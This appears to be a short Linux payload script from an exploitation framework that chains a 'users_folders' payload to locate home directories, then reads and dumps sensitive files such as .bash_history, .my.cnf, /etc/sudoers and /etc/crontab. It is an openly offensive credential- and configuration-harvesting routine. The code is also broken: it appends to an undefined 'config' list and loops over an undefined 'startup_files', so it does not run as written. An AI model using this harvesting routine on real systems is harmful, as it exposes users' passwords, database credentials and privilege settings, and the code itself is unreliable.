#REQUIRE_LINUX
#This payload uses "users_folders" payload to find ".rc" and other configuration files, 
#some of them may contain sensitive information.

result = []
config_files = []

folders = run_payload('users_folders')
for folder in folders:
    config_files.append(folder+'.bashrc')
    config_files.append(folder+'.bashrc~')
    config_files.append(folder+'.bash_history')
    config_files.append(folder+'.bash_profile')
    config_files.append(folder+'.gtk-bookmarks')
    config_files.append(folder+'.conkyrc')
    config_files.append(folder+'.my.cnf')
config.append('/etc/sudoers')
config.append('/etc/inittab')
config.append('/etc/crontab')
config.append('/etc/sysctl.conf')

for file in startup_files:
    if read(file) != '':
        result.append('-------------------------')
        result.append('FILE => '+file)
        result.append(read(file))


result = [p for p in result if p != '']
